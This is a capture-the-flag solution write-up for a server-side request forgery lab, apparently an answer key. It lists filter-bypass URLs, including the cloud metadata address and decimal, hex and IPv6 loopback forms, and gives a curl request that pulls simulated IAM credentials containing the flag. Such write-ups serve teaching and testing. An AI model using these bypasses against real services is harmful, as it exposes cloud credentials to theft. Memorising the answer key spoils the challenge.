# SSRF to Internal - Solution

## Vulnerability

The image preview service fetches arbitrary URLs server-side. The URL filter only blocks `127.0.0.1`, `localhost`, and `0.0.0.0`, but does not block other addresses that resolve to the server itself, such as `169.254.169.254` (cloud metadata) or alternative loopback representations.

Since the cloud metadata endpoint is simulated on the same Flask server, the SSRF target is accessible via the server's own address.

## Steps to Solve

1. **Explore the application**: Visit the main page and note the image preview functionality and the security warning about blocked addresses.

2. **Test the filter**: Confirm that `http://127.0.0.1:5000/` and `http://localhost:5000/` are blocked.

3. **Bypass the filter**: The filter does not block all internal addresses. Use one of these approaches:

   - Access the metadata endpoint directly via the container's own IP or Docker bridge IP:
     ```
     http://169.254.169.254:5000/latest/meta-data/iam/credentials
     ```

   - Use alternative loopback representations:
     ```
     http://2130706433:5000/latest/meta-data/iam/credentials  (decimal IP for 127.0.0.1)
     http://0x7f000001:5000/latest/meta-data/iam/credentials  (hex IP for 127.0.0.1)
     http://[::]:5000/latest/meta-data/iam/credentials        (IPv6 any)
     ```

4. **Submit the SSRF payload**:

   ```bash
   curl -X POST http://localhost:5000/preview \
     -H "Content-Type: application/json" \
     -d '{"url":"http://169.254.169.254:5000/latest/meta-data/iam/credentials"}'
   ```

5. **Read the response** containing the flag in the `AccessKey` field:

   ```json
   {"AccessKey": "CTF{REDACTED}", ...}
   ```

## Flag

```
CTF{REDACTED}
```
